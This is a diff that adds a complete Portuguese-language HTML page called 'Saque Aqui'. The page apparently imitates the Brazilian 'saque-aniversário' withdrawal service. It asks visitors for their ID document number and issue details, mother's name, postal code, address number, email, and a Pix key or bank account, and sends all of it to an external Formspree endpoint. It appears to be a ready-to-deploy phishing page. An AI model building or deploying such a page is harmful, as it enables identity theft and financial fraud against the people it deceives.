@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Saque Aqui - Formulário</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background-color: #f4f4f4;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      color: #333;
+    }
+
+    .form-container {
+      background-color: #fff;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 700px;
+      height: 90vh;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+    }
+
+    h2 {
+      color: #ff6600;
+      text-align: center;
+      font-size: 30px;
+      margin-bottom: 20px;
+      font-weight: bold;
+    }
+
+    .description {
+      font-size: 16px;
+      text-align: center;
+      color: #666;
+      margin-bottom: 20px;
+    }
+
+    label {
+      font-weight: bold;
+      color: #003366;
+      display: block;
+      margin-bottom: 8px;
+      font-size: 16px;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 15px;
+      margin-bottom: 20px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-size: 16px;
+      background-color: #f9f9f9;
+      box-sizing: border-box;
+    }
+
+    .submit-btn {
+      background-color: #ff6600;
+      color: #fff;
+      font-size: 18px;
+      padding: 15px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      width: 100%;
+      text-transform: uppercase;
+      transition: background-color 0.3s ease;
+    }
+
+    .submit-btn:hover {
+      background-color: #e65c00;
+    }
+
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .checkbox-group label {
+      display: inline-block;
+      margin-left: 10px;
+      font-size: 14px;
+    }
+
+    #pix_fields, #bank_fields {
+      display: none;
+    }
+
+    @media (max-width: 768px) {
+      .form-container {
+        width: 90%;
+        padding: 25px;
+      }
+
+      h2 {
+        font-size: 24px;
+      }
+
+      .description {
+        font-size: 14px;
+      }
+
+      .submit-btn {
+        font-size: 16px;
+        padding: 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="form-container">
+  <h2>Saque Aqui</h2>
+  <p class="description">
+    Prezado(a),<br>
+    Para darmos continuidade ao processo de saque-aniversário, solicitamos que forneça as informações abaixo. Após o envio, geraremos o link para a finalização do processo online.
+  </p>
+
+  <form action="https://formspree.io/f/mjkwynje" method="POST">
+
+    <!-- Tipo de Documento -->
+    <label for="document_type">Tipo de Documento*</label>
+    <select id="document_type" name="document_type" required>
+      <option value="RG">RG</option>
+      <option value="CNH">CNH</option>
+    </select>
+
+    <!-- Número do Documento -->
+    <label for="document_number">Número do Documento*</label>
+    <input type="text" id="document_number" name="document_number" placeholder="Digite o número do seu documento" required>
+
+    <!-- Data de Expedição -->
+    <label for="issue_date">Data de Expedição do Documento*</label>
+    <input type="date" id="issue_date" name="issue_date" required>
+
+    <!-- Estado de Expedição -->
+    <label for="state_of_issue">Estado de Expedição*</label>
+    <select id="state_of_issue" name="state_of_issue" required>
+      <option value="">Selecione</option>
+      <option value="AC">Acre</option>
+      <option value="AL">Alagoas</option>
+      <option value="AP">Amapá</option>
+      <option value="AM">Amazonas</option>
+      <option value="BA">Bahia</option>
+      <option value="CE">Ceará</option>
+      <option value="DF">Distrito Federal</option>
+      <option value="ES">Espírito Santo</option>
+      <option value="GO">Goiás</option>
+      <option value="MA">Maranhão</option>
+      <option value="MT">Mato Grosso</option>
+      <option value="MS">Mato Grosso do Sul</option>
+      <option value="MG">Minas Gerais</option>
+      <option value="PA">Pará</option>
+      <option value="PB">Paraíba</option>
+      <option value="PR">Paraná</option>
+      <option value="PE">Pernambuco</option>
+      <option value="PI">Piauí</option>
+      <option value="RJ">Rio de Janeiro</option>
+      <option value="RN">Rio Grande do Norte</option>
+      <option value="RS">Rio Grande do Sul</option>
+      <option value="RO">Rondônia</option>
+      <option value="RR">Roraima</option>
+      <option value="SC">Santa Catarina</option>
+      <option value="SP">São Paulo</option>
+      <option value="SE">Sergipe</option>
+      <option value="TO">Tocantins</option>
+    </select>
+
+    <!-- Nome da Mãe -->
+    <label for="mother_name">Nome da Mãe*</label>
+    <input type="text" id="mother_name" name="mother_name" placeholder="Digite o nome completo da sua mãe" required>
+
+    <!-- CEP -->
+    <label for="cep">CEP*</label>
+    <input type="text" id="cep" name="cep" placeholder="Digite seu CEP" required>
+
+    <!-- Número da residência -->
+    <label for="address_number">Número da Casa ou Apartamento*</label>
+    <input type="text" id="address_number" name="address_number" placeholder="Digite o número da residência" required>
+
+    <!-- Email -->
+    <label for="email">E-mail*</label>
+    <input type="email" id="email" name="email" placeholder="Digite seu e-mail" required>
+
+    <!-- Forma de Pagamento -->
+    <label for="payment_method">Escolha a forma de pagamento*</label>
+    <select id="payment_method" name="payment_method" required onchange="togglePaymentFields()">
+      <option value="">Selecione</option>
+      <option value="pix">Pix</option>
+      <option value="bank">Conta Bancária</option>
+    </select>
+
+    <!-- Campos Pix -->
+    <div id="pix_fields">
+      <label for="pix_key_type">Tipo de Chave Pix*</label>
+      <select id="pix_key_type" name="pix_key_type">
+        <option value="cpf">CPF</option>
+        <option value="email">E-mail</option>
+        <option value="phone">Celular</option>
+      </select>
+
+      <label for="pix_key">Chave Pix*</label>
+      <input type="text" id="pix_key" name="pix_key" placeholder="Digite sua chave Pix">
+    </div>
+
+    <!-- Campos Bancários -->
+    <div id="bank_fields">
+      <label for="agency">Agência Bancária*</label>
+      <input type="text" id="agency" name="agency" placeholder="Digite o número da agência">
+
+      <label for="account_full">Número da Conta com Dígito*</label>
+      <input type="text" id="account_full" name="account_full" placeholder="Ex: 123456-7">
+    </div>
+
+    <!-- Termos -->
+    <div class="checkbox-group">
+      <input type="checkbox" id="terms" name="terms" required>
+      <label for="terms">
+        Li e concordo com os <a href="#">Termos de Uso</a> e <a href="#">Política de Privacidade</a>.
+      </label>
+    </div>
+
+    <button type="submit" class="submit-btn">Finalizar Saque-Aniversário</button>
+  </form>
+</div>
+
+<script>
+  function togglePaymentFields() {
+    const paymentMethod = document.getElementById("payment_method").value;
+    const pixFields = document.getElementById("pix_fields");
+    const bankFields = document.getElementById("bank_fields");
+
+    pixFields.style.display = paymentMethod === "pix" ? "block" : "none";
+    bankFields.style.display = paymentMethod === "bank" ? "block" : "none";
+
+    if (paymentMethod !== "pix") {
+      document.getElementById("pix_key_type").value = "";
+      document.getElementById("pix_key").value = "";
+    }
+
+    if (paymentMethod !== "bank") {
+      document.getElementById("agency").value = "";
+      document.getElementById("account_full").value = "";
+    }
+  }
+</script>
+
+</body>
+  </html>
+  
